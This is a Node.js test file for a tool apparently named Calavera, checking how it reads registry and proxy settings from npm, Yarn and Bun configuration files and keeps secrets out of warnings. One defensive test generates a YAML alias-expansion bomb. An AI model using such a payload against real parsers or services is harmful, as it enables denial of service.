import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { access, mkdir, writeFile } from "node:fs/promises";
import { join } from "node:path";
import test, { afterEach } from "node:test";
import { inspect, promisify } from "node:util";

import { detectLauncher, yarnEnvironmentFiles, yarnParentCwd } from "../src/launcher-config.js";
import { loadNpmRegistryOptions } from "../src/npm-config.js";
import { removeTemporaryDirectories, temporaryDirectory } from "./temporary-directory.mjs";

afterEach(removeTemporaryDirectories);

const SCOPE = "@schalkneethling";
const SECRET = "SECRETVALUE0123456789";
const YARN = "yarn/4.9.1 npm/? node/v24.3.0 darwin arm64";
const BUN = "bun/1.3.9 npm/? node/v24.3.0 darwin arm64";

/**
 * A home folder, a workspace folder, and a project inside it, all in a temporary directory, with an
 * environment that cannot reach the developer's own configuration files. `files` maps a path
 * relative to the temporary directory to its content.
 * @param {{ files?: Record<string, string>, env?: Record<string, string>, userAgent?: string }} setup
 */
async function fixture({ files = {}, env = {}, userAgent }) {
  const directory = await temporaryDirectory("calavera-launcher-config-");
  const home = join(directory, "home");
  const cwd = join(directory, "workspace", "project");
  await mkdir(home, { recursive: true });
  await mkdir(cwd, { recursive: true });
  for (const [path, content] of Object.entries(files)) {
    await mkdir(join(directory, path, ".."), { recursive: true });
    await writeFile(join(directory, path), content);
  }
  return {
    cwd,
    scope: SCOPE,
    // The home folder stands in for the operating system account's, so its files are the user's own.
    accountHome: home,
    // Under Yarn, the folder Yarn's own process ran in, which Calavera reads from /proc on Linux.
    ...(userAgent === YARN ? { yarnProcessCwd: cwd } : {}),
    env: {
      HOME: home,
      ...(userAgent ? { npm_config_user_agent: userAgent } : {}),
      // Yarn passes the folder it started in to every binary and script it runs.
      // and the project folder it ran in as PROJECT_CWD.
      ...(userAgent === YARN ? { INIT_CWD: cwd, PROJECT_CWD: cwd } : {}),
      ...env,
    },
  };
}

test("under Yarn 2 or later, the project .yarnrc.yml registry is used and the .npmrc registry is not", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.npmrc": "registry=https://npm-mirror.example.com/\n",
      "workspace/project/.yarnrc.yml": 'npmRegistryServer: "https://yarn-mirror.example.com"\n',
    },
  });
  const { options, registry } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://yarn-mirror.example.com");
  assert.deepEqual(registry, {
    origin: "https://yarn-mirror.example.com",
    source: "project .yarnrc.yml",
    setting: "npmRegistryServer",
  });
});

test("under Yarn with no registry setting, the Yarn default registry is used", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "home/.npmrc": "registry=https://npm-mirror.example.com/\n" },
  });
  const { options, registry } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.yarnpkg.com");
  assert.deepEqual(registry, {
    origin: "https://registry.yarnpkg.com",
    source: "default",
    setting: null,
  });
});

test("under Yarn, npmScopes names the scope without @ and falls back to npmRegistryServer", async () => {
  const scoped = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.yarnrc.yml":
        "npmRegistryServer: https://yarn-mirror.example.com\nnpmScopes:\n  schalkneethling:\n    npmRegistryServer: https://scoped.example.com\n",
    },
  });
  const scopedResult = await loadNpmRegistryOptions(scoped);
  assert.equal(scopedResult.options[`${SCOPE}:registry`], "https://scoped.example.com");
  assert.equal(scopedResult.registry.origin, "https://scoped.example.com");

  const unscoped = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.yarnrc.yml":
        "npmRegistryServer: https://yarn-mirror.example.com\nnpmScopes:\n  other:\n    npmRegistryServer: https://other.example.com\n",
    },
  });
  const unscopedResult = await loadNpmRegistryOptions(unscoped);
  assert.equal(unscopedResult.options[`${SCOPE}:registry`], undefined);
  assert.equal(unscopedResult.registry.origin, "https://yarn-mirror.example.com");
});

test("under Yarn, the nearest .yarnrc.yml wins over parent folders and the home folder", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "npmRegistryServer: https://home.example.com\n",
      "workspace/.yarnrc.yml": "npmRegistryServer: https://workspace.example.com\n",
      "workspace/project/.yarnrc.yml": "npmRegistryServer: https://project.example.com\n",
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.registry,
    "https://project.example.com",
  );

  const parentOnly = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "npmRegistryServer: https://home.example.com\n",
      "workspace/.yarnrc.yml": "npmRegistryServer: https://workspace.example.com\n",
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(parentOnly)).options.registry,
    "https://workspace.example.com",
  );

  const homeOnly = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "npmRegistryServer: http://home.example.com\n" },
  });
  assert.deepEqual((await loadNpmRegistryOptions(homeOnly)).registry, {
    origin: "http://home.example.com",
    source: "user .yarnrc.yml",
    setting: "npmRegistryServer",
  });
});

test("under Yarn, YARN_NPM_REGISTRY_SERVER overrides the files, and YARN_RC_FILENAME renames them", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": "npmRegistryServer: https://project.example.com\n" },
    env: { YARN_NPM_REGISTRY_SERVER: "https://env.example.com" },
  });
  assert.deepEqual((await loadNpmRegistryOptions(context)).registry, {
    origin: "https://env.example.com",
    source: "environment",
    setting: "YARN_NPM_REGISTRY_SERVER",
  });

  const renamed = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.yarnrc.yml": "npmRegistryServer: https://default-name.example.com\n",
      "workspace/project/custom.yml": "npmRegistryServer: https://custom-name.example.com\n",
    },
    env: { YARN_RC_FILENAME: "custom.yml" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(renamed)).options.registry,
    "https://custom-name.example.com",
  );
});

test("under Yarn, the user .yarnrc.yml expands variables in a proxy value", async () => {
  const user = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "httpsProxy: ${PROXY_URL:-http://fallback-proxy.example.com}\n" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(user)).options.proxy,
    "http://fallback-proxy.example.com",
  );
});

test("under Yarn, a registry value with a variable stops the command, from a user or a project file", async () => {
  /** @type {[string, RegExp][]} */
  const cases = [
    ["home/.yarnrc.yml", /npmRegistryServer in the user \.yarnrc\.yml contains a variable/],
    [
      "workspace/project/.yarnrc.yml",
      /npmRegistryServer in the project \.yarnrc\.yml contains a variable/,
    ],
  ];
  for (const [path, message] of cases) {
    const context = await fixture({
      userAgent: YARN,
      files: { [path]: "npmRegistryServer: https://registry.example.com/${REGISTRY_TOKEN}/\n" },
      env: { REGISTRY_TOKEN: SECRET },
    });
    await assert.rejects(loadNpmRegistryOptions(context), (error) => {
      assert.match(error.message, message);
      assert.doesNotMatch(
        inspect(error, { depth: 10 }),
        new RegExp(`${SECRET}|registry\\.example`),
      );
      return true;
    });
  }
});

test("under Yarn, an unset variable in a user .yarnrc.yml proxy drops the setting and names the variable", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "httpsProxy: http://${CALAVERA_UNSET_HOST}\n" },
  });
  const { options, unsetVariables, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
  assert.deepEqual(unsetVariables, ["CALAVERA_UNSET_HOST"]);
  assert.match(diagnostics.join("\n"), /httpsProxy.*user \.yarnrc\.yml.*CALAVERA_UNSET_HOST/);
});

test("under Yarn, httpsProxy is used for an https registry and the .npmrc proxy is not", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.npmrc": "https-proxy=http://npm-proxy.example.com/\nnoproxy=a.example.com\n",
      "home/.yarnrc.yml": `httpProxy: http://plain-proxy.example.com\nhttpsProxy: http://user:${SECRET}@secure-proxy.example.com\n`,
    },
  });
  const { options, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, `http://user:${SECRET}@secure-proxy.example.com`);
  assert.equal(options.httpsProxy, undefined);
  assert.equal(options.noProxy, undefined);
  assert.doesNotMatch(inspect(diagnostics), new RegExp(SECRET));
});

test("under Yarn, httpProxy is used for an http registry", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml":
        "npmRegistryServer: http://registry.example.com\nhttpProxy: http://plain-proxy.example.com\nhttpsProxy: http://secure-proxy.example.com\n",
    },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://plain-proxy.example.com");
});

test("under Yarn, no .npmrc file and no npm_config_* variable is read", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.npmrc": "registry=https://project-npm.example.com/\n",
    },
    env: {
      npm_config_registry: "https://env-npm.example.com/",
      npm_config_https_proxy: "http://env-proxy.example.com/",
      "npm_config_//registry.yarnpkg.com/:_authToken": SECRET,
    },
  });
  // A folder where the user .npmrc would be: reading it would add a warning.
  await mkdir(join(context.env.HOME, ".npmrc"));
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, { registry: "https://registry.yarnpkg.com" });
  assert.deepEqual([warnings, diagnostics], [[], []]);
});

test("under Yarn, a project .yarnrc.yml cannot choose an http registry", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": "npmRegistryServer: http://registry.example.com\n" },
  });
  await assert.rejects(
    loadNpmRegistryOptions(context),
    /npmRegistryServer.*project \.yarnrc\.yml.*https/,
  );
});

test("an unparseable .yarnrc.yml is skipped with a warning that names the path and position, not the content", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": `npmAuthToken: ${SECRET}\n  bad: [\n` },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.yarnpkg.com");
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /\.yarnrc\.yml.*line \d+, column \d+/);
  assert.doesNotMatch(inspect(warnings), new RegExp(SECRET));
});

test("under Yarn 1, the loader refuses instead of reading the npm settings (ADR-0023)", async () => {
  const context = await fixture({
    userAgent: "yarn/1.22.22 npm/? node/v24.3.0 darwin arm64",
    files: {
      "home/.npmrc": "registry=https://npm-mirror.example.com/\n",
      "workspace/project/.yarnrc.yml": "npmRegistryServer: https://yarn-mirror.example.com\n",
    },
  });
  await assert.rejects(loadNpmRegistryOptions({ ...context, runtime: "node" }), {
    message: "Calavera does not support Yarn 1.22.22. Use Yarn 2 or later, npm, pnpm, or Bun.",
  });
});

test("without a launcher user agent, Yarn and Bun files are not read", async () => {
  const context = await fixture({
    files: {
      "workspace/project/.yarnrc.yml": "npmRegistryServer: https://yarn-mirror.example.com\n",
      "workspace/project/bunfig.toml": '[install]\nregistry = "https://bun-mirror.example.com/"\n',
    },
  });
  const { registry } = await loadNpmRegistryOptions(context);
  assert.deepEqual(registry, {
    origin: "https://registry.npmjs.org",
    source: "default",
    setting: null,
  });
});

test("under Bun, the project bunfig.toml registry overrides the .npmrc files", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "home/.npmrc": "registry=https://npm-mirror.example.com/\n",
      "workspace/project/bunfig.toml": '[install]\nregistry = "https://bun-mirror.example.com/"\n',
    },
  });
  const { options, registry } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://bun-mirror.example.com/");
  assert.deepEqual(registry, {
    origin: "https://bun-mirror.example.com",
    source: "project bunfig.toml",
    setting: "install.registry",
  });
});

test("under Bun, the .npmrc registry applies when no bunfig.toml sets one", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: { "workspace/project/.npmrc": "registry=https://npm-mirror.example.com/\n" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.registry,
    "https://npm-mirror.example.com/",
  );
});

test("under Bun, the project bunfig.toml overrides the global one, and XDG_CONFIG_HOME moves the global one", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": '[install]\nregistry = "https://global.example.com/"\n',
      "workspace/project/bunfig.toml": '[install]\nregistry = "https://project.example.com/"\n',
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.registry,
    "https://project.example.com/",
  );

  const globalOnly = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": '[install]\nregistry = "https://home.example.com/"\n',
      "xdg/.bunfig.toml": '[install]\nregistry = "https://xdg.example.com/"\n',
    },
  });
  globalOnly.env.XDG_CONFIG_HOME = join(globalOnly.env.HOME, "..", "xdg");
  assert.deepEqual((await loadNpmRegistryOptions(globalOnly)).registry, {
    origin: "https://xdg.example.com",
    source: "user bunfig.toml",
    setting: "install.registry",
  });
});

test("under Bun, BUN_CONFIG_REGISTRY and NPM_CONFIG_REGISTRY override bunfig.toml", async () => {
  const files = {
    "workspace/project/bunfig.toml": '[install]\nregistry = "https://project.example.com/"\n',
  };
  const npmVariable = await fixture({
    userAgent: BUN,
    files,
    env: { NPM_CONFIG_REGISTRY: "https://npm-env.example.com/" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(npmVariable)).options.registry,
    "https://npm-env.example.com/",
  );

  const bunVariable = await fixture({
    userAgent: BUN,
    files,
    env: {
      NPM_CONFIG_REGISTRY: "https://npm-env.example.com/",
      BUN_CONFIG_REGISTRY: "https://bun-env.example.com/",
    },
  });
  assert.deepEqual((await loadNpmRegistryOptions(bunVariable)).registry, {
    origin: "https://bun-env.example.com",
    source: "environment",
    setting: "BUN_CONFIG_REGISTRY",
  });
});

test("under Bun, a scope registry is read with or without @, from a string or a table", async () => {
  const withAt = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/bunfig.toml":
        '[install.scopes]\n"@schalkneethling" = "https://scoped.example.com/"\n',
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(withAt)).options[`${SCOPE}:registry`],
    "https://scoped.example.com/",
  );

  const bare = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/bunfig.toml":
        '[install.scopes]\nschalkneethling = { url = "https://bare.example.com/", token = "$npm_token" }\n',
    },
  });
  const bareResult = await loadNpmRegistryOptions(bare);
  assert.equal(bareResult.options[`${SCOPE}:registry`], "https://bare.example.com/");
  assert.equal(bareResult.registry.origin, "https://bare.example.com");
});

test("under Bun, credentials in a bunfig.toml registry are left out of the URL and never printed", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/bunfig.toml": `[install]\nregistry = "https://user:${SECRET}@registry.example.com/"\n[install.scopes]\nschalkneethling = { url = "https://scoped.example.com/", token = "${SECRET}" }\n`,
    },
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.example.com/");
  assert.equal(options[`${SCOPE}:registry`], "https://scoped.example.com/");
  assert.deepEqual(warnings, [
    "Used install.registry from the project bunfig.toml without the username and password in its URL: Calavera sends no credentials to any registry.",
  ]);
  assert.doesNotMatch(inspect([options, warnings, diagnostics]), new RegExp(SECRET));
});

test("under Bun, the .npmrc proxy settings are not used, because Bun does not read them", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: { "home/.npmrc": "https-proxy=http://npm-proxy.example.com/\n" },
  });
  const result = await loadNpmRegistryOptions(context);
  assert.equal(result.options.httpsProxy, undefined);
  assert.deepEqual(result.warnings, [
    "Ignored https-proxy in the user .npmrc: Bun does not read proxy settings from .npmrc files, so Calavera, which Bun runs, does not either. To use a proxy, set HTTPS_PROXY.",
  ]);
});

test("an unparseable bunfig.toml is skipped with a warning that names the path and position, not the content", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: { "workspace/project/bunfig.toml": `[install]\nregistry = "${SECRET}\n` },
  });
  const { warnings } = await loadNpmRegistryOptions(context);
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /bunfig\.toml.*line \d+, column \d+/);
  assert.doesNotMatch(inspect(warnings), new RegExp(SECRET));
});

test("under Bun, a project bunfig.toml cannot choose an http registry", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/bunfig.toml": '[install]\nregistry = "http://registry.example.com/"\n',
    },
  });
  await assert.rejects(
    loadNpmRegistryOptions(context),
    /install\.registry.*project bunfig\.toml.*https/,
  );
});

test("under Bun, $XDG_CONFIG_HOME/.npmrc is the user .npmrc when it exists", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "home/.npmrc": "registry=https://home.example.com/\n",
      "xdg/.npmrc": "registry=https://xdg.example.com/\n",
    },
  });
  const xdg = join(context.env.HOME, "..", "xdg");
  assert.equal(
    (await loadNpmRegistryOptions({ ...context, env: { ...context.env, XDG_CONFIG_HOME: xdg } }))
      .options.registry,
    "https://xdg.example.com/",
  );
  // Without the file, the home .npmrc applies; npm itself never reads the XDG file.
  const missing = join(context.env.HOME, "..", "no-xdg");
  assert.equal(
    (
      await loadNpmRegistryOptions({
        ...context,
        env: { ...context.env, XDG_CONFIG_HOME: missing },
      })
    ).options.registry,
    "https://home.example.com/",
  );
  const { npm_config_user_agent: _, ...npmEnv } = context.env;
  assert.equal(
    (await loadNpmRegistryOptions({ ...context, env: { ...npmEnv, XDG_CONFIG_HOME: xdg } })).options
      .registry,
    "https://home.example.com/",
  );
});

test("the launcher is read from the start of npm_config_user_agent", () => {
  /** @type {[string | undefined, string][]} */
  const cases = [
    [undefined, "npm"],
    ["npm/11.20.0 node/v24.3.0 darwin arm64 workspaces/false", "npm"],
    ["pnpm/11.28.10 npm/? node/v24.3.0 darwin arm64", "npm"],
    ["yarn/2.4.3 npm/? node/v24.3.0 darwin arm64", "yarn"],
    ["yarn/10.0.0 npm/? node/v24.3.0 darwin arm64", "yarn"],
    ["bun/1.3.9 npm/? node/v24.3.0 darwin arm64", "bun"],
    ["npm/11.20.0 bun/1.3.9", "npm"],
    ["npm/11.20.0 yarn/4.9.1", "npm"],
  ];
  for (const [agent, launcher] of cases) {
    assert.equal(
      detectLauncher(agent === undefined ? {} : { npm_config_user_agent: agent }),
      launcher,
      String(agent),
    );
  }
});

test("under Yarn, YARN_HTTPS_PROXY and YARN_HTTP_PROXY override the files", async () => {
  const https = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "httpsProxy: http://file-proxy.example.com\n" },
    env: { yarn_https_proxy: "http://env-proxy.example.com" },
  });
  assert.equal((await loadNpmRegistryOptions(https)).options.proxy, "http://env-proxy.example.com");

  const http = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "npmRegistryServer: http://registry.example.com\n" },
    env: { YARN_HTTP_PROXY: "http://env-proxy.example.com" },
  });
  assert.equal((await loadNpmRegistryOptions(http)).options.proxy, "http://env-proxy.example.com");
});

test("under Yarn, the fallback forms follow Yarn: :- also replaces an empty value, - only an unset one", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml":
        "httpProxy: http://${EMPTY_HOST:-colon.example.com}\nhttpsProxy: http://proxy${EMPTY_HOST-.fallback}.example.com\n",
    },
    env: { EMPTY_HOST: "" },
  });
  assert.equal((await loadNpmRegistryOptions(context)).options.proxy, "http://proxy.example.com");
  // httpProxy applies to an http registry.
  const env = { ...context.env, YARN_NPM_REGISTRY_SERVER: "http://registry.example.com" };
  assert.equal(
    (await loadNpmRegistryOptions({ ...context, env })).options.proxy,
    "http://colon.example.com",
  );

  const unset = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpsProxy: http://proxy${CALAVERA_UNSET-.fallback}.example.com\n",
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(unset)).options.proxy,
    "http://proxy.fallback.example.com",
  );
});

test("under Yarn, a nested fallback is not understood, so the setting is ignored", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "httpsProxy: http://${A_HOST:-${B_HOST}}\n" },
    env: { B_HOST: "b.example.com" },
  });
  const { options, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
  assert.match(diagnostics.join("\n"), /httpsProxy.*unsupported/);
});

test("under Yarn, an empty .yarnrc.yml or an empty scope entry is not an error", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "",
      "workspace/.yarnrc.yml": "just a string\n",
      "workspace/project/.yarnrc.yml": "npmScopes:\n  schalkneethling:\n",
    },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.yarnpkg.com");
  assert.deepEqual(warnings, []);
});

test("under Yarn, a project inside the home folder still trusts the home .yarnrc.yml", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "npmRegistryServer: http://registry.example.com\n" },
  });
  const cwd = join(context.env.HOME, "code", "project");
  await mkdir(cwd, { recursive: true });
  const { registry } = await loadNpmRegistryOptions({ ...context, cwd });
  assert.deepEqual(registry, {
    origin: "http://registry.example.com",
    source: "user .yarnrc.yml",
    setting: "npmRegistryServer",
  });
});

test("errors and warnings name the Yarn or Bun setting as the person wrote it", async () => {
  const scoped = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "npmScopes:\n  schalkneethling:\n    npmRegistryServer: not-a-url\n",
    },
  });
  await assert.rejects(
    loadNpmRegistryOptions(scoped),
    /The Yarn setting npmScopes\.schalkneethling\.npmRegistryServer in the user \.yarnrc\.yml must be an http or https URL/,
  );

  const yarnVariable = await fixture({
    userAgent: YARN,
    env: { YARN_NPM_REGISTRY_SERVER: "not-a-url" },
  });
  await assert.rejects(
    loadNpmRegistryOptions(yarnVariable),
    /The Yarn setting YARN_NPM_REGISTRY_SERVER must be/,
  );

  const proxy = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpProxy: ftp://a.example.com\nhttpsProxy: ftp://b.example.com\n",
    },
  });
  const { warnings } = await loadNpmRegistryOptions(proxy);
  assert.match(warnings[0], /Ignored httpProxy in the user \.yarnrc\.yml/);
  assert.match(warnings[1], /Ignored httpsProxy in the user \.yarnrc\.yml/);

  const bunScope = await fixture({
    userAgent: BUN,
    files: { "home/.bunfig.toml": '[install.scopes]\nschalkneethling = "not-a-url"\n' },
  });
  await assert.rejects(
    loadNpmRegistryOptions(bunScope),
    /The Bun setting install\.scopes\.schalkneethling in the user bunfig\.toml must be/,
  );
});

test("under Bun, credential fields of a registry table are not read, and a table without url is skipped", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": `[install]\nregistry = { url = "https://registry.example.com/", username = "me", password = "${SECRET}", token = "${SECRET}" }\n[install.scopes]\nschalkneethling = { token = "${SECRET}" }\n`,
    },
  });
  const { options, registry, diagnostics } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, { registry: "https://registry.example.com/" });
  assert.equal(registry.source, "user bunfig.toml");
  // Calavera does not look for credential keys, so it does not name them either (ADR-0021).
  assert.deepEqual(diagnostics, []);
});

test("under Yarn, only the registry and proxy options reach pacote", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.npmrc": "//registry.yarnpkg.com/:_authToken=token-value\nstrict-ssl=false\n",
      "home/.yarnrc.yml":
        "httpProxy: http://plain-proxy.example.com\nhttpsProxy: http://secure-proxy.example.com\nenableScripts: false\nnpmAuthToken: token-value\n",
    },
    env: {
      YARN_ENABLE_TELEMETRY: "0",
      YARN_NPM_AUTH_TOKEN: "token-value",
      OTHER_VARIABLE: "value",
    },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, {
    registry: "https://registry.yarnpkg.com",
    proxy: "http://secure-proxy.example.com",
  });
});

test("an unscoped package ignores Yarn and Bun scope settings", async () => {
  const yarn = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml":
        "npmScopes:\n  schalkneethling:\n    npmRegistryServer: https://scoped.example.com\n",
    },
  });
  const yarnResult = await loadNpmRegistryOptions({ ...yarn, scope: undefined });
  assert.equal(yarnResult.registry.origin, "https://registry.yarnpkg.com");

  const bun = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": '[install.scopes]\nschalkneethling = "https://scoped.example.com/"\n',
    },
  });
  const bunResult = await loadNpmRegistryOptions({ ...bun, scope: undefined });
  assert.deepEqual(bunResult.registry, {
    origin: "https://registry.npmjs.org",
    source: "default",
    setting: null,
  });
});

test("under Bun, a username or password in a registry URL is removed with a warning, and no other note is added", async () => {
  const plain = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": '[install]\nregistry = { url = "https://registry.example.com/" }\n',
    },
  });
  const plainResult = await loadNpmRegistryOptions(plain);
  assert.equal(plainResult.options.registry, "https://registry.example.com/");
  assert.deepEqual(plainResult.diagnostics, []);

  for (const url of [
    `https://user:${SECRET}@registry.example.com/`,
    `https://${SECRET}@registry.example.com/`,
    `https://:${SECRET}@registry.example.com/`,
  ]) {
    const context = await fixture({
      userAgent: BUN,
      files: { "workspace/project/bunfig.toml": `[install]\nregistry = { url = "${url}" }\n` },
    });
    const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
    assert.equal(options.registry, "https://registry.example.com/");
    assert.deepEqual(warnings, [
      "Used install.registry from the project bunfig.toml without the username and password in its URL: Calavera sends no credentials to any registry.",
    ]);
    assert.doesNotMatch(inspect([options, warnings, diagnostics]), new RegExp(SECRET));
  }
});

test("under Bun, the user bunfig.toml and BUN_CONFIG_REGISTRY may choose an http registry", async () => {
  const user = await fixture({
    userAgent: BUN,
    files: { "home/.bunfig.toml": '[install]\nregistry = "http://registry.example.com/"\n' },
  });
  assert.equal((await loadNpmRegistryOptions(user)).registry.origin, "http://registry.example.com");

  const variable = await fixture({
    userAgent: BUN,
    env: { BUN_CONFIG_REGISTRY: "http://registry.example.com/" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(variable)).registry.origin,
    "http://registry.example.com",
  );
});

test("parse warnings say which package manager's file was skipped", async () => {
  const yarn = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": "a: [\n" },
  });
  assert.match(
    (await loadNpmRegistryOptions(yarn)).warnings[0],
    /^Could not parse the Yarn configuration file /,
  );
  const bun = await fixture({
    userAgent: BUN,
    files: { "workspace/project/bunfig.toml": "[install\n" },
  });
  assert.match(
    (await loadNpmRegistryOptions(bun)).warnings[0],
    /^Could not parse the Bun configuration file /,
  );
});

test("an unreadable .yarnrc.yml or bunfig.toml is skipped with a warning that names the file kind and code", async () => {
  const yarn = await fixture({ userAgent: YARN });
  await mkdir(join(yarn.cwd, ".yarnrc.yml"));
  assert.match(
    (await loadNpmRegistryOptions(yarn)).warnings[0],
    /^Could not read the Yarn configuration file .*\.yarnrc\.yml \(EISDIR\)/,
  );
  const bun = await fixture({ userAgent: BUN });
  await mkdir(join(bun.cwd, "bunfig.toml"));
  assert.match(
    (await loadNpmRegistryOptions(bun)).warnings[0],
    /^Could not read the Bun configuration file .*bunfig\.toml \(EISDIR\)/,
  );
});

test("under Bun, a registry string without credentials and a scope table without url add no note", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": `[install]\nregistry = "https://registry.example.com/"\n[install.scopes]\nschalkneethling = { token = "value" }\n`,
    },
  });
  const { options, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.example.com/");
  assert.deepEqual(diagnostics, []);
});

test("under Bun, BUN_CONFIG_REGISTRY that does not start with http:// or https:// is skipped, as Bun skips it", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: { "home/.bunfig.toml": '[install]\nregistry = "https://file.example.com/"\n' },
    env: { BUN_CONFIG_REGISTRY: "mirror.example.com" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.registry,
    "https://file.example.com/",
  );
});

test("under Bun, a $VAR registry stops the command, from the user or a project bunfig.toml", async () => {
  for (const [path, layer] of [
    ["home/.bunfig.toml", "user"],
    ["workspace/project/bunfig.toml", "project"],
  ]) {
    const context = await fixture({
      userAgent: BUN,
      files: { [path]: '[install]\nregistry = "$MY_REGISTRY"\n' },
      env: { MY_REGISTRY: `https://registry.example.com/${SECRET}/` },
    });
    await assert.rejects(loadNpmRegistryOptions(context), (error) => {
      assert.match(
        error.message,
        new RegExp(
          `^The Bun setting install\\.registry in the ${layer} bunfig\\.toml contains a variable reference\\.`,
        ),
      );
      assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(SECRET));
      return true;
    });
  }
});

test("under Bun, NPM_CONFIG_REGISTRY wins over bunfig.toml although bun run sets npm_lifecycle_event", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/.npmrc": "registry=https://a.example.com/\n",
      "home/.bunfig.toml": '[install]\nregistry = "https://b.example.com/"\n',
    },
    env: {
      NPM_CONFIG_REGISTRY: "https://a.example.com/",
      npm_command: "run-script",
      npm_lifecycle_event: "start",
    },
  });
  assert.deepEqual((await loadNpmRegistryOptions(context)).registry, {
    origin: "https://a.example.com",
    source: "environment",
    setting: "NPM_CONFIG_REGISTRY",
  });
});

test("a .yarnrc.yml with excessive aliases is skipped with a warning instead of stopping the lookup", async () => {
  const lines = ['a: &a ["x","x","x","x","x","x","x","x","x"]'];
  const names = "abcdefghi";
  for (let index = 1; index < names.length; index += 1) {
    lines.push(
      `${names[index]}: &${names[index]} [${Array(9)
        .fill(`*${names[index - 1]}`)
        .join(",")}]`,
    );
  }
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": `${lines.join("\n")}\n` },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.yarnpkg.com");
  assert.match(
    warnings[0],
    /^Could not parse the Yarn configuration file .*\.yarnrc\.yml, so Calavera skipped it\.$/,
  );
});

test("under Yarn, an escaped \\${NAME} in a proxy is not expanded, so the setting is ignored", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "httpsProxy: http://\\${PROXY_HOST}\n" },
